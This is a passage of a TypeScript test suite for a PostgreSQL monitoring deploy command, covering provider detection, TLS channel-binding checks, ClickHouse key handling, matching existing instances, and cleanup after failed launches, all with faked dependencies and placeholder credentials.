import {
  describe, expect, spyOn, test } from "bun:test";
import { Client, type ClientConfig } from "pg";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { handleToolCall } from "../lib/mcp-server";
import { HttpRequestTimeoutError, HttpStatusError } from "../lib/util";
import { StepView, monitoringSteps } from "../lib/deploy";
import { resolveAdminConnection } from "../lib/init";
import { CancelledError, CONNECT_TIMEOUT_MS, STILL_CREATING, mayHaveRun, platformDeps, NO_VCPUS_NOTE, httpStatus, disconnectBilling, errorText, resultLines, stepProgress, priceText, checkUrlParams, ClickhouseKeyError, FIRST_CHECKUP_DELAY_MS, clickhouseOrgFor, clusterOf, connect, connectStatus, pickPlace, stateOf, databaseName, detectCloudProvider, parseClickhouseKey, prepareDatabase, unprepareDatabase, progressText, type ConnectDeps, type Database, type PrepareOptions, type ProgressEvent, type SupabaseProject, type SupabaseProjects, supabaseProjectRows } from "../lib/connect";
import { notAdminNext as notAdminNextText } from "../lib/deploy-surface";

// `pgai mon deploy` (postgres-ai/internal#354): the step machine, with every
// outside effect faked and recorded. Whole results are compared, so a change
// to what a user or an agent sees shows up here.

const CH = "postgresql://postgres:adminpw@abc123.us-east-1.aws.pg.clickhouse.cloud:5432/postgres?sslmode=require";
const CH_NAME = "abc123.us-east-1.aws.pg.clickhouse.cloud/postgres";
const MON = "postgresql://postgres_ai_mon:genpw@abc123.us-east-1.aws.pg.clickhouse.cloud:5432/postgres?sslmode=require";
const ORG = "11111111-2222-3333-4444-555555555555";
const KEY = "AbCdEf0123456789XyZa:Sec4b1dTestSecret0123456789";
const FREE_QUOTE = {
  plan: "scale", org_alias: "acme", billed: false, free_slots: { remaining: 1, total: 1 }, subscription: false, quantity: 0,
  price: { amount: 51200, currency: "usd", interval: "month" }, has_payment_method: false, requires_payment_method: false,
};
const FREE = { price: "free (1 of 1 free slots)", requires_payment_method: false };

function fake(over: Partial<ConnectDeps> & { rows?: (Database | undefined)[] } = {}) {
  const calls: string[] = [];
  const rows = over.rows ?? [];
  let listed = 0;
  const deps: ConnectDeps = {
    list: async () => { calls.push("list"); const r = rows[Math.min(listed++, rows.length - 1)]; return r ? [r] : []; },
    create: async (body) => { calls.push(`create ${JSON.stringify(body)}`); return { id: "i-1", name: CH_NAME, status: "launch_requested" }; },
    // The check before the price (nothing changed) is recorded apart from the prepare.
    prepare: async (url, provider, o) => { calls.push(`${o?.check ? "check" : "prepare"} ${provider}`); return o?.check ? { checked: true } : { monitoringUrl: MON }; },
    unprepare: async () => { calls.push("unprepare"); return true; },
    localStackRunning: () => false,
    clickhouseOrg: async (host, keyId) => { calls.push(`clickhouseOrg ${host} ${keyId}`); return { orgId: ORG, state: "running" }; },
    selfHosted: async (url, env) => { calls.push(`selfHosted ${url} ${JSON.stringify(env)}`); },
    handoffUrl: async (provider) => `https://console.postgres.ai/acme/monitoring/scale/create/${provider}`,
    supabaseStart: async () => { throw new Error("not a Supabase test"); },
    supabaseStatus: async () => { throw new Error("not a Supabase test"); },
    supabaseConnect: async () => { throw new Error("not a Supabase test"); },
    // The billing step is its own describe below; here a box is on a free slot.
    quote: async () => FREE_QUOTE,
    billingUrl: (alias) => `https://console.postgres.ai/${alias}/billing`,
    confirm: async () => false,
    resetLock: async (server) => { calls.push(`resetLock ${server}`); return { lock_id: "l-1" }; },
    resetUnlock: async (lockId) => { calls.push(`resetUnlock ${lockId}`); },
    sleep: async () => { calls.push("sleep"); },
    now: () => Date.now(),
    progress: () => {},
    ...over,
  };
  return { deps, calls };
}

/** A clock that moves only when deploy sleeps, so a 5-minute wait takes no time. */
function clock() {
  let t = 0;
  let naps = 0;
  return { now: () => t, sleep: async (ms: number) => { t += ms; naps++; }, naps: () => naps };
}

const NOT_CONFIRMED = "PostgresAI did not confirm the monitoring box within 5 minutes. Run pgai mon instances list: if this database is there, follow it with pgai mon instances watch <id>; if not, run pgai mon deploy again";

const row = (status: string | null, extra: Partial<Database> = {}): Database => ({
  id: "i-1", name: CH_NAME, provider: "clickhouse", status,
  dashboard_url: status === "active" ? "https://abc.pgai.watch" : null, host_metrics: true, ...extra,
});

describe("provider and name", () => {
  test("cluster ignores host case and one trailing dot", () => {
    expect(clusterOf("postgresql://u:p@DB.Example.COM./app")).toBe("db.example.com:5432");
    expect(clusterOf("postgresql://u:p@DB.Example.COM.:6432/app")).toBe("db.example.com:6432");
    expect(clusterOf("postgresql://u:p@DB.Example.COM../app")).toBe("db.example.com.:5432");
  });

  test("provider from the host", () => {
    expect([
      CH,
      "postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app",
      "postgresql://u:p@db.xyz.supabase.co:5432/postgres",
      "postgresql://u:p@aws-0-eu-central-1.pooler.supabase.com:6543/postgres",
      "postgresql://u:p@10.0.0.5:5432/app",
    ].map(detectCloudProvider)).toEqual(["clickhouse", "rds", "supabase", "supabase", "self-managed"]);
  });

  test("name is what the platform derives: host, port unless 5432, database", () => {
    expect(databaseName(CH)).toBe(CH_NAME);
    expect(databaseName("postgresql://u:p@db2.example.com:6432/app")).toBe("db2.example.com:6432/app");
  });

  test("a URL without a database: the name has the one pg connects to, as the monitoring URL will", () => {
    expect(databaseName("postgresql://postgres:p@db2.example.com:6432")).toBe("db2.example.com:6432/postgres");
    expect(databaseName("postgresql://db2.example.com/?user=app_admin&password=p&sslmode=require")).toBe("db2.example.com/app_admin");
    process.env.PGDATABASE = "orders";
    try {
      expect(databaseName("postgresql://postgres:p@db2.example.com")).toBe("db2.example.com/orders");
    } finally {
      delete process.env.PGDATABASE;
    }
  });

  test("ClickHouse key from the flag or the environment", () => {
    expect(parseClickhouseKey(KEY, {})).toEqual({ keyId: "AbCdEf0123456789XyZa", keySecret: "Sec4b1dTestSecret0123456789" });
    expect(parseClickhouseKey(undefined, { CLICKHOUSE_KEY_ID: "a", CLICKHOUSE_KEY_SECRET: "b" })).toEqual({ keyId: "a", keySecret: "b" });
    expect(parseClickhouseKey(undefined, {})).toBeUndefined();
    expect(() => parseClickhouseKey("no-colon", {})).toThrow("--clickhouse-key must be <key-id>:<key-secret>");
  });
});

test("first_checkup_eta uses the reporter's default initial delay", () => {
  const script = readFileSync(resolve(import.meta.dir, "../../config/scripts/postgres-reports.sh"), "utf8");
  const m = script.match(/\$\{REPORTER_INITIAL_DELAY_SECONDS:-(\d+)\}/);
  expect(m).not.toBeNull();
  expect(Number(m![1]) * 1000).toBe(FIRST_CHECKUP_DELAY_MS);
});

describe("mon deploy", () => {
  test.each(["disable", "allow"])("channel_binding=require with sslmode=%s refuses before quoting or preparing, including agents", async (sslmode) => {
    for (const agent of [false, true]) {
      const f = fake();
      f.deps.quote = async () => { f.calls.push("quote"); return FREE_QUOTE; };
      const result = await connect(`${CH.replace("sslmode=require", `sslmode=${sslmode}`)}&channel_binding=require`, { waitMs: 0, agent }, f.deps);
      expect(result.status).toBe("action_required");
      expect(result.next).toBe(`channel_binding=require needs TLS, but sslmode=${sslmode} is set`);
      expect(f.calls).toEqual([]);
    }
  });

  test("channel_binding=require with verify-full strips the box URL and warns once, including agents", async () => {
    for (const agent of [false, true]) {
      const messages: string[] = [];
      const f = fake({
        progress: (event) => { messages.push(event.message); },
        prepare: async (url, _provider, o) => o?.check ? { checked: true } : { monitoringUrl: url.replace("postgres:adminpw", "postgres_ai_mon:genpw") },
      });
      const result = await connect(`${CH.replace("sslmode=require", "sslmode=verify-full")}&channel_binding=require`, { waitMs: 0, agent }, f.deps);
      expect(result.status).toBe("in_progress");
      const body = JSON.parse(f.calls.find((c) => c.startsWith("create "))!.slice(7));
      expect(body.db_url).toBe(MON.replace("sslmode=require", "sslmode=verify-full"));
      expect(messages.filter((m) => m.includes("collector"))).toEqual(["Warning: the collector can't do channel binding; it connects with TLS and full certificate verification"]);
    }
  });

  test.each(["require", "prefer", "verify-ca", ""])("channel_binding=require upgrades sslmode=%s before quoting and preparing, including agents", async (sslmode) => {
    for (const agent of [false, true]) {
      const seen: string[] = [], messages: string[] = [];
      const f = fake({
        prepare: async (url, _provider, o) => { seen.push(url); return o?.check ? { checked: true } : { monitoringUrl: url.replace("postgres:adminpw", "postgres_ai_mon:genpw") }; },
        progress: (event) => { messages.push(event.message); },
      });
      Object.assign(f.deps, { verifyTls: async (url: string) => { f.calls.push("verifyTls"); seen.push(url); } });
      f.deps.quote = async () => { f.calls.push("quote"); return FREE_QUOTE; };
      const url = new URL(CH);
      if (sslmode) url.searchParams.set("sslmode", sslmode); else url.searchParams.delete("sslmode");
      url.searchParams.set("channel_binding", "require");
      const result = await connect(url.toString(), { waitMs: 0, agent }, f.deps);
      expect(result.status).toBe("in_progress");
      expect(f.calls[0]).toBe("verifyTls");
      expect(f.calls).toContain("quote");
      expect(seen).toEqual(Array(3).fill(CH.replace("sslmode=require", "sslmode=verify-full")));
      const body = JSON.parse(f.calls.find((c) => c.startsWith("create "))!.slice(7));
      expect(body.db_url).toBe(MON.replace("sslmode=require", "sslmode=verify-full"));
      expect(messages.filter((m) => m.includes("collector"))).toEqual(["Warning: the collector can't do channel binding; it connects with TLS and full certificate verification; upgraded to sslmode=verify-full"]);
    }
  });

  test.each(["DEPTH_ZERO_SELF_SIGNED_CERT", "SELF_SIGNED_CERT_IN_CHAIN", "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "UNABLE_TO_GET_ISSUER_CERT_LOCALLY", "ERR_TLS_CERT_ALTNAME_INVALID", "CERT_HAS_EXPIRED"])("channel_binding=require refuses certificate error %s before any platform or database changes, including agents", async (code) => {
    for (const agent of [false, true]) {
      const f = fake();
      Object.assign(f.deps, { verifyTls: async () => { throw Object.assign(new Error("certificate rejected"), { code }); } });
      f.deps.quote = async () => { f.calls.push("quote"); return FREE_QUOTE; };
      const result = await connect(`${CH}&channel_binding=require`, { waitMs: 0, agent }, f.deps);
      expect(result.status).toBe("action_required");
      expect(result.next).toContain("sslrootcert=<CA file>");
      expect(result.next).toContain("sslmode=verify-full");
      expect(result.next).toContain("removing channel_binding=require from the URL");
      expect(f.calls).toEqual([]);
    }
  });

  test("channel_binding=require verifies with a supplied CA and reuses the box CA note", async () => {
    const seen: string[] = [], messages: string[] = [];
    const f = fake({
      prepare: async (url, _provider, o) => o?.check ? { checked: true } : { monitoringUrl: url.replace("postgres:adminpw", "postgres_ai_mon:genpw").replace("&sslrootcert=%2Ftmp%2Fca.pem", "") },
      progress: (event) => { messages.push(event.message); },
    });
    Object.assign(f.deps, { verifyTls: async (url: string) => { seen.push(url); } });
    const result = await connect(`${CH}&channel_binding=require&sslrootcert=%2Ftmp%2Fca.pem`, { waitMs: 0 }, f.deps);
    expect(result.status).toBe("in_progress");
    expect(seen).toEqual([`${CH.replace("sslmode=require", "sslmode=verify-full")}&sslrootcert=%2Ftmp%2Fca.pem`]);
    expect(messages.join("\n")).toContain("the monitoring box has no copy of the CA in sslrootcert");
    expect(f.calls.find((c) => c.startsWith("create "))).toContain(MON.replace("sslmode=require", "sslmode=verify-full"));
    expect(f.calls.find((c) => c.startsWith("create "))).not.toContain("channel_binding");
  });

  test("ClickHouse with a key: find the org, prepare, provision, wait, dashboard", async () => {
    const { deps, calls } = fake({ rows: [undefined, row("launch_requested"), row("active")] });
    const result = await connect(CH, { clickhouseKey: KEY, waitMs: 60_000 }, deps);
    expect(calls).toEqual([
      "list",
      `clickhouseOrg abc123.us-east-1.aws.pg.clickhouse.cloud AbCdEf0123456789XyZa`,
      "check clickhouse",
      "prepare clickhouse",
      `create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true, provider: "clickhouse", clickhouse_org_id: ORG, clickhouse_key_id: "AbCdEf0123456789XyZa", clickhouse_key_secret: "Sec4b1dTestSecret0123456789" })}`, // gitleaks:allow (fake fixture key)
      // No checkup of its own: the box runs the first one (first_checkup_eta).
      "sleep", "list", "sleep", "list",
    ]);
    const { first_checkup_eta, ...rest } = result;
    expect(rest).toEqual({
      status: "ready", provider: "clickhouse", name: CH_NAME, id: "i-1",
      dashboard_url: "https://abc.pgai.watch", host_metrics: true, ...FREE, next: "Open https://abc.pgai.watch",
    });
    // The reporter's first run: at the earliest 3 minutes after the stack starts.
    const eta = Date.parse(first_checkup_eta!) - Date.now();
    expect(eta).toBeGreaterThan(3 * 60_000 - 5_000);
    expect(eta).toBeLessThanOrEqual(3 * 60_000);
    expect(JSON.stringify(result)).not.toContain("adminpw");
    expect(JSON.stringify(result)).not.toContain("Sec4b1d");
  });

  test("TLS warnings of every session are progress events, each said once (the step view keeps them)", async () => {
    const UNVERIFIED = "Warning: the database server certificate is not verified.";
    const FELL_BACK = "Warning: connected to the database without TLS after SSL negotiation failed.";
    const PLAINTEXT = "Warning: this database connection uses plaintext, without TLS.";
    const events: string[] = [];
    type Warn = { warn?: (m: string) => void };
    const { deps } = fake({
      // The probe, the prepare and its logins, then the drop after a refused launch: each opens a session and warns.
      prepare: async (_url, _provider, o) => {
        (o as Warn)?.warn?.(UNVERIFIED);
        if (!o?.check) (o as Warn)?.warn?.(FELL_BACK);
        return o?.check ? { checked: true } : { monitoringUrl: MON, generated: true };
      },
      create: async () => ({ id: "i-9", name: CH_NAME, status: "failed", error: "The monitoring box could not be launched (HTTP 422)." }),
      unprepare: async (_url, _user, o) => { o?.warn?.(UNVERIFIED); o?.warn?.(PLAINTEXT); return true; },
      progress: (e) => events.push(`${e.event}: ${e.message}`),
    });
    expect((await connect(CH, { clickhouseKey: KEY, waitMs: 60_000 }, deps)).status).toBe("failed");
    expect(events.filter((e) => e.includes("Warning:"))).toEqual([`preparing: ${UNVERIFIED}`, `preparing: ${FELL_BACK}`, `provisioning: ${PLAINTEXT}`]);
  });

  test.each(["sales data", "注文", "slash/name", "app"])("a retry finds a custom-named database by identity (%s)", async (db) => {
    const u = new URL(CH);
    u.pathname = `/${encodeURIComponent(db)}`;
    const existing = row("active", { name: "Monitoring 16bb1d", cluster: `${u.hostname}:5432`, database: encodeURIComponent(db) });
    const { deps, calls } = fake({ rows: [existing] });
    const result = await connect(u.toString(), { waitMs: 0 }, deps);
    expect(result.status).toBe("ready");
    expect(result.name).toBe(existing.name);
    expect(calls).toEqual(["list"]);
  });

  test.each(["sales%20data", "%E6%B3%A8%E6%96%87", "slash%2Fname", "%61pp"])("a legacy box with an unknown database blocks creating a non-plain raw path (%s)", async (path) => {
    const url = `postgresql://u:p@db.example.com:5432/${path}`;
    const legacy = row("active", { name: "Monitoring 16bb1d", cluster: "DB.Example.COM.:5432", database: null });
    const { deps, calls } = fake({ rows: [legacy], quote: async () => { calls.push("quote"); return FREE_QUOTE; } });
    const result = await connect(url, { waitMs: 0 }, deps);
    expect(result.status).toBe("action_required");
    expect(result.next).toBe("An earlier box on this server may already monitor this database (its name is not known): see pgai mon instances list, and delete that box first (pgai mon instances delete <id>) if it is this database");
    expect(calls).toEqual(["list"]);
  });

  test.each([
    ["a plain database path", "app", {}],
    ["another cluster", "sales%20data", { cluster: "other.example.com:5432" }],
    ["no known cluster", "sales%20data", { cluster: null }],
    ["a known other database", "sales%20data", { database: "orders" }],
    ["a custom name", "sales%20data", { name: "production" }],
    ["a box being deleted", "sales%20data", { status: "deleting_launched" }],
  ] as const)("a legacy box does not block creating with %s", async (_, path, extra) => {
    const legacy = row("active", { name: "Monitoring 16bb1d", cluster: "db.example.com:5432", database: null, ...extra });
    const { deps, calls } = fake({ rows: [legacy] });
    expect((await connect(`postgresql://u:p@db.example.com:5432/${path}`, { waitMs: 0 }, deps)).status).toBe("in_progress");
    expect(calls).toContain("prepare self-managed");
    expect(calls.some((c) => c.startsWith("create "))).toBe(true);
  });

  test("a known database match takes precedence over a legacy box with an unknown database", async () => {
    const legacy = row("active", { name: "Monitoring 16bb1d", cluster: "db.example.com:5432", database: null });
    const existing = row("active", { id: "i-2", name: "production", cluster: legacy.cluster, database: "sales%20data" });
    const { deps, calls } = fake({ list: async () => { calls.push("list"); return [legacy, existing]; } });
    const result = await connect("postgresql://u:p@db.example.com:5432/sales%20data", { waitMs: 0 }, deps);
    expect(result.status).toBe("ready");
    expect(result.id).toBe(existing.id);
    expect(calls).toEqual(["list"]);
  });

  test("identity takes precedence over a legacy display-name match", async () => {
    const existing = row("active", { id: "i-2", name: "Monitoring 16bb1d", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: "postgres" });
    const { deps, calls } = fake({ list: async () => { calls.push("list"); return [row("active"), existing]; } });
    expect((await connect(CH, { waitMs: 0 }, deps)).id).toBe("i-2");
    expect(calls).toEqual(["list"]);
  });

  for (const underLock of [false, true]) {
    test.each([true, false])(`a trailing-dot cluster matches this database (${underLock ? "under the lock" : "before the lock"}, URL dotted: %p)`, async (dotted) => {
      const url = `postgresql://u:p@DB.Example.COM${dotted ? "." : ""}:5432/app`;
      const existing = row("active", { name: "Production", cluster: `DB.Example.COM${dotted ? "" : "."}:5432`, database: "app" });
      const { deps, calls } = fake({ rows: underLock ? [undefined, existing] : [existing] });
      const result = await connect(url, { waitMs: 0, resetPassword: underLock }, deps);
      expect(result.status).toBe(underLock ? "action_required" : "ready");
      expect(result.id).toBe(existing.id);
      expect(calls).toEqual(underLock ? ["list", "check self-managed", "resetLock db.example.com:5432", "list", "resetUnlock l-1"] : ["list"]);
    });

    test.each([true, false])(`a trailing-dot cluster blocks resetting another database (${underLock ? "under the lock" : "before the lock"}, URL dotted: %p)`, async (dotted) => {
      const url = `postgresql://u:p@DB.Example.COM${dotted ? "." : ""}:5432/app`;
      const other = row("active", { name: "Production", cluster: `DB.Example.COM${dotted ? "" : "."}:5432`, database: "orders" });
      const { deps, calls } = fake({ rows: underLock ? [undefined, other] : [other] });
      const result = await connect(url, { waitMs: 0, resetPassword: true }, deps);
      expect(result.status).toBe("action_required");
      expect(result.next).toContain("would cut off the monitoring of Production on this server");
      expect(calls).toEqual(underLock ? ["list", "check self-managed", "resetLock db.example.com:5432", "list", "resetUnlock l-1"] : ["list"]);
    });
  }

  test.each([
    { cluster: "other.example.com:5432", database: "postgres" },
    { cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: "orders" },
  ])("a matching display name with a different identity is not this database (%p)", async (identity) => {
    const { deps, calls } = fake({ rows: [row("active", identity)] });
    expect((await connect(CH, { waitMs: 0 }, deps)).status).toBe("in_progress");
    expect(calls).toContain("prepare clickhouse");
  });

  test.each([false, true])("a display-name collision with another database blocks a reset (under lock: %p)", async (underLock) => {
    const other = row("active", { cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: "orders" });
    const { deps, calls } = fake({ rows: underLock ? [undefined, other] : [other] });
    const result = await connect(CH, { resetPassword: true, waitMs: 0 }, deps);
    expect(result.status).toBe("action_required");
    expect(result.next).toContain(`would cut off the monitoring of ${CH_NAME}`);
    expect(calls).toEqual(underLock ? ["list", "check clickhouse", "resetLock abc123.us-east-1.aws.pg.clickhouse.cloud:5432", "list", "resetUnlock l-1"] : ["list"]);
  });

  test.each([
    { cluster: null, database: null },
    { cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: null },
    { cluster: null, database: "postgres" },
  ])("a row without complete identity still matches by name (%p)", async (identity) => {
    const { deps, calls } = fake({ rows: [row("active", identity)] });
    expect((await connect(CH, { waitMs: 0 }, deps)).status).toBe("ready");
    expect(calls).toEqual(["list"]);
  });

  test("identity uses the user or PGDATABASE when the URL has no path", async () => {
    const saved = process.env.PGDATABASE;
    const u = new URL(CH);
    u.pathname = "";
    try {
      for (const db of ["postgres", "sales data"]) {
        if (db === "postgres") delete process.env.PGDATABASE;
        else process.env.PGDATABASE = db;
        const { deps, calls } = fake({ rows: [row("active", { name: "Monitoring 16bb1d", cluster: `${u.hostname}:5432`, database: encodeURIComponent(db) })] });
        expect((await connect(u.toString(), { waitMs: 0 }, deps)).status).toBe("ready");
        expect(calls).toEqual(["list"]);
      }
    } finally {
      if (saved === undefined) delete process.env.PGDATABASE;
      else process.env.PGDATABASE = saved;
    }
  });

  test.each(["sales data", "注文"])("the same database is found by identity under the reset lock (%s)", async (db) => {
    const u = new URL(CH);
    u.pathname = `/${encodeURIComponent(db)}`;
    const existing = row("registered", { name: "Monitoring 16bb1d", cluster: `${u.hostname}:5432`, database: encodeURIComponent(db) });
    const { deps, calls } = fake({ rows: [undefined, existing] });
    const result = await connect(u.toString(), { resetPassword: true, waitMs: 0 }, deps);
    expect(result.status).toBe("action_required");
    expect(result.id).toBe(existing.id);
    expect(calls).toEqual(["list", "check clickhouse", `resetLock ${u.hostname}:5432`, "list", "resetUnlock l-1"]);
  });

  test("already connected: nothing is prepared or provisioned again", async () => {
    const { deps, calls } = fake({ rows: [row("active")] });
    const result = await connect(CH, { waitMs: 60_000 }, deps);
    expect(calls).toEqual(["list"]);
    expect(result).toEqual({
      status: "ready", provider: "clickhouse", name: CH_NAME, id: "i-1",
      dashboard_url: "https://abc.pgai.watch", host_metrics: true, next: "Open https://abc.pgai.watch",
    });
  });

  test("a row still being deleted (a delete in flight) is not reused", async () => {
    const { deps, calls } = fake({ rows: [row("deleting_launched"), row("launch_requested")] });
    await connect(CH, { waitMs: 0 }, deps);
    expect(calls.slice(0, 3)).toEqual(["list", "check clickhouse", "prepare clickhouse"]);
  });

  test("a delete that failed to launch is failed (and can be retried), not disconnecting", () => {
    expect(connectStatus(row("deleting_failed_to_launch")).status).toBe("failed");
  });

  test("pgai mon instances status shows a delete in flight as disconnecting, not provisioning", () => {
    expect(connectStatus(row("deleting_launched"))).toEqual({
      status: "deleting", provider: "clickhouse", name: CH_NAME, id: "i-1", dashboard_url: null, host_metrics: true, next: "none",
    });
  });

  test("one state vocabulary for mon deploy, mon instances status and list: the platform's states mapped", () => {
    const raw = [null, "launch_requested", "registered", "active", "failed_to_launch", "failed", "deleting_launched", "deleting_failed_to_launch", "deleted"];
    expect(Object.fromEntries(raw.map((r) => [String(r), stateOf(r)]))).toEqual({
      null: "in_progress", launch_requested: "in_progress", registered: "in_progress", active: "ready",
      failed_to_launch: "failed", failed: "failed", deleting_launched: "deleting", deleting_failed_to_launch: "failed", deleted: "deleted",
    });
  });

  test("RDS hands off to the console flow, touching nothing", async () => {
    const { deps, calls } = fake();
    expect(await connect("postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app", { waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "rds", name: "db.abc.us-east-1.rds.amazonaws.com/app",
      next: "Finish in the console: https://console.postgres.ai/acme/monitoring/scale/create/rds",
    });
    expect(calls).toEqual([]);
  });

  test.each([
    "postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app",
    "postgresql://u:p@db.xyz.supabase.co:5432/postgres",
  ])("generic explicitly selects the existing direct path for %s", async (url) => {
    for (const provider of ["generic", "self-managed"]) {
      const { deps, calls } = fake();
      const result = await connect(url, { provider, waitMs: 0 }, deps);
      expect(result.status).toBe("in_progress");
      expect(result.provider).toBe("self-managed");
      expect(calls).toContain("check self-managed");
      expect(calls).toContain("prepare self-managed");
      expect(calls.some((c) => c.startsWith("create "))).toBe(true);
    }
  });

  test("generic is trimmed and case-insensitive, as dblab deploy's --provider is", async () => {
    const { deps, calls } = fake();
    const result = await connect("postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app",
      { provider: " Generic ", waitMs: 0 }, deps);
    expect(result.provider).toBe("self-managed");
    expect(calls).toContain("check self-managed");
  });

  test("generic still refuses a failed TLS verification before changes, and says why", async () => {
    const { deps, calls } = fake({ verifyTls: async () => {
      throw Object.assign(new Error("certificate rejected"), { code: "CERT_HAS_EXPIRED" });
    } });
    const result = await connect("postgresql://u:p@db.example.com:5432/app?sslmode=require&channel_binding=require",
      { provider: "generic", waitMs: 0 }, deps);
    expect(result).toEqual({
      status: "action_required", provider: "self-managed", name: "db.example.com/app",
      next: "Could not verify the TLS certificate for channel_binding=require (certificate rejected). "
        + "Provide sslrootcert=<CA file> with sslmode=verify-full, or explicitly accept the downgrade by removing channel_binding=require from the URL",
    });
    expect(calls).toEqual([]);
  });

  test("generic does not bypass permission or payment refusal", async () => {
    const url = "postgresql://u:p@db.example.com:5432/app";
    const permission = fake({ prepare: async () => ({ sql: "-- required grants", next: "Run the SQL" }) });
    expect(await connect(url, { provider: "generic", waitMs: 0 }, permission.deps)).toEqual({
      status: "action_required", provider: "self-managed", name: "db.example.com/app", sql: "-- required grants", next: "Run the SQL",
    });
    expect(permission.calls.some((c) => c.startsWith("create "))).toBe(false);
    const payment = fake({ quote: async () => ({ ...FREE_QUOTE, billed: true, requires_payment_method: true }) });
    const refused = await connect(url, { provider: "generic", waitMs: 0 }, payment.deps);
    expect(refused).toMatchObject({ status: "action_required", requires_payment_method: true });
    expect(refused.next).toStartWith("Add a payment method at ");
    expect(payment.calls).toEqual(["list", "check self-managed"]);
  });

  test("a URL that cannot create the role: the SQL and the next step, nothing provisioned", async () => {
    const { deps, calls } = fake({ prepare: async () => ({ sql: "-- 01.role\ncreate role ...", next: "Run the SQL" }) });
    expect(await connect(CH, { waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, sql: "-- 01.role\ncreate role ...", next: "Run the SQL",
    });
    expect(calls).toEqual(["list"]);
  });

  test("a stopped ClickHouse service: start it first, the database is not touched", async () => {
    const { deps, calls } = fake({ clickhouseOrg: async () => ({ orgId: ORG, state: "stopped" }) });
    const result = await connect(CH, { clickhouseKey: KEY, waitMs: 0 }, deps);
    expect(result).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: "Start the service in the ClickHouse Cloud console (it is stopped), then re-run",
    });
    expect(calls).toEqual(["list"]);
  });

  const REJECTED = "ClickHouse Cloud rejected the API key (401). Check the key id and secret.";

  test("a rejected ClickHouse key: action required (exit 3) before the database is touched", async () => {
    const { deps, calls } = fake({ clickhouseOrg: async () => { throw new ClickhouseKeyError(REJECTED); } });
    expect(await connect(CH, { clickhouseKey: KEY, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, next: `${REJECTED} Then re-run`,
    });
    expect(calls).toEqual(["list"]);
  });

  test("a re-run with a key checks the key: a rejected one is action required, not connected", async () => {
    const { deps, calls } = fake({ rows: [row("active")], clickhouseOrg: async (host, keyId) => { calls.push(`clickhouseOrg ${host} ${keyId}`); throw new ClickhouseKeyError(REJECTED); } });
    expect(await connect(CH, { clickhouseKey: KEY, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, id: "i-1",
      next: `${REJECTED} Nothing was changed: re-run with the right key, or without one`,
    });
    expect(calls).toEqual(["list", "clickhouseOrg abc123.us-east-1.aws.pg.clickhouse.cloud AbCdEf0123456789XyZa"]);
  });

  test("a re-run with a good key: connected, nothing prepared again", async () => {
    const { deps, calls } = fake({ rows: [row("active")] });
    expect((await connect(CH, { clickhouseKey: KEY, waitMs: 0 }, deps)).status).toBe("ready");
    expect(calls).toEqual(["list", "clickhouseOrg abc123.us-east-1.aws.pg.clickhouse.cloud AbCdEf0123456789XyZa"]);
  });

  test("the ClickHouse API failing (not the key) is a failure, exit 1", async () => {
    const { deps } = fake({ rows: [row("active")], clickhouseOrg: async () => { throw new Error("ClickHouse Cloud API request failed (503)."); } });
    await expect(connect(CH, { clickhouseKey: KEY, waitMs: 0 }, deps)).rejects.toThrow("(503)");
  });

  const REFUSED = { id: "i-9", name: CH_NAME, status: "failed", error: "The monitoring box could not be launched (HTTP 422). Nothing is billed; try again later." };

  test("the platform could not launch the box", async () => {
    const { deps, calls } = fake({ create: async () => REFUSED });
    expect(await connect(CH, { waitMs: 60_000 }, deps)).toEqual({
      status: "failed", provider: "clickhouse", name: CH_NAME, id: "i-9",
      next: "The monitoring box could not be launched (HTTP 422). Nothing is billed; try again later. Re-run pgai mon deploy later.",
    });
    // The role was there before, or has the user's PGAI_MON_PASSWORD: it stays.
    expect(calls).toEqual(["list", "check clickhouse", "prepare clickhouse"]);
  });

  // The role this run created with a generated password: nobody has the
  // password, so the re-run would stop at "postgres_ai_mon already exists".
  describe("a launch that fails after the role was created with a generated password", () => {
    const generated: Partial<ConnectDeps> = { prepare: async () => ({ monitoringUrl: MON, generated: true }) };

    test("refused by the platform (in the reply, or a 4xx): the role is dropped again", async () => {
      const inReply = fake({ ...generated, create: async () => REFUSED });
      expect((await connect(CH, { waitMs: 0 }, inReply.deps)).status).toBe("failed");
      expect(inReply.calls).toEqual(["list", "unprepare"]);

      const http = fake({ ...generated, create: async () => { throw new HttpStatusError("Failed to cloud monitoring connect: HTTP 403", 403); } });
      await expect(connect(CH, { waitMs: 0 }, http.deps)).rejects.toThrow("HTTP 403");
      expect(http.calls).toEqual(["list", "unprepare"]);
    });

    test("a drop that fails does not hide the refusal", async () => {
      const { deps } = fake({ ...generated, create: async () => REFUSED, unprepare: async () => { throw new Error("connection refused"); } });
      expect((await connect(CH, { waitMs: 0 }, deps)).next).toBe(`${REFUSED.error} Re-run pgai mon deploy later.`);
    });

    test("no answer (a proxy's 502): a box may be starting with this URL, so the role stays", async () => {
      // A 502: deploy looks for the box (postgresai#443); none appears, so it does not confirm one.
      const unanswered = fake({ ...generated, ...clock(), create: async () => { throw new HttpStatusError("HTTP 502", 502); } });
      expect((await connect(CH, { waitMs: 0 }, unanswered.deps)).next).toBe(NOT_CONFIRMED);
      expect(unanswered.calls).not.toContain("unprepare");
      // An error that is neither an answer nor "no answer" still ends the run.
      const err = new Error("timed out");
      const { deps, calls } = fake({ ...generated, create: async () => { throw err; } });
      await expect(connect(CH, { waitMs: 0 }, deps)).rejects.toThrow(err.message);
      expect(calls).toEqual(["list"]);
    });

    test("a launch that starts: the role stays", async () => {
      const { deps, calls } = fake({ ...generated });
      expect((await connect(CH, { waitMs: 0 }, deps)).status).toBe("in_progress");
      expect(calls).not.toContain("unprepare");
    });
  });

